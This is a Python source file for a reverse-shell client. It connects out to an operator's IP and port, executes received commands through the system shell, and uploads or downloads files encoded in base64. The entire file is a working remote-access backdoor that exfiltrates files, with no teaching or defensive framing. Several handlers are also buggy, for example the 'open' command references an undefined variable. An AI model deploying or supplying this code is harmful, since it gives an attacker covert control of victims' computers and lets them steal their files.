import socket
import subprocess
import simplejson
import os
import base64

class MySocket:

    def __init__(self, ip, port):

        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.my_connection.connect((ip, port))

    def command_execution(self, command):

        return subprocess.check_output(command, shell=True)

    def json_send(self, data):

        json_data = simplejson.dumps(data)

        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):

        json_data = ""

        while True:

            try:

                json_data = json_data + self.my_connection.recv(1024).decode()

                return simplejson.loads(json_data)



            except ValueError:

                continue

    def execute_cd_directory_command(self, directory):

        os.chdir(directory)

        return os.getcwd()

    def execute_os_command(self):

        command_os_output = os.name

        if command_os_output == "nt":

            return "Windows"

        elif command_os_output == "posix":

            print("Linux")

        else:

            return "Error!"

    def execute_download_command(self, path):

        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def execute_upload_command(self, path, content):

        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))

            return "Okay."

    def execute_pwd_command(self):

        output_pwd_command = os.getcwd()

        return output_pwd_command + "\n"

    def execute_cd_path_command(self, path):

        os.chdir(path)

        return os.getcwd()

    def execute_ls_command(self):

        current_directory = os.getcwd()

        output_ls_command = os.listdir(current_directory)

        for i in output_ls_command:
            return i

    def execute_clear_command(self):

        os.system('cls')

    def execute_open_command(self, file):

        convert_to_str = str(command[1])

        output_open_command = os.startfile(convert_to_str)

        return output_open_command

    def start_socket(self):

        while True:

            command = self.json_receive()

            try:

                if command[0] == "exit":

                    self.my_connection.close()

                    exit()



                elif command[0] == "cd" and os.path.isdir(command[1]):

                    command_output = self.execute_cd_directory_command(command[1])



                elif command[0] == "os":

                    command_output = self.execute_os_command()



                elif command[0] == "download":

                    command_output = self.execute_download_command(command[1])



                elif command[0] == "upload":

                    command_output = self.execute_upload_command(command[1], command[2])



                elif command[0] == "pwd":

                    command_output = self.execute_pwd_command()



                elif command[0] == "cd":

                    command_output = self.execute_cd_path_command(command[1])



                elif command[0] == "ls":

                    command_output = self.execute_ls_command()



                elif command[0] == "clear":

                    command_output = self.execute_clear_command()



                elif command[0] == "open" and os.path.isfile(command[1]):

                    command_output = self.execute_open_command(command[1])



                else:

                    command_output = self.command_execution(command)





            except Exception:

                command_output = "Invalid command!"

            self.json_send(command_output)

        self.my_connection.close()


my_socket_object = MySocket(ip,port)  # write ur ip address and indicate port number.

my_socket_object.start_socket() 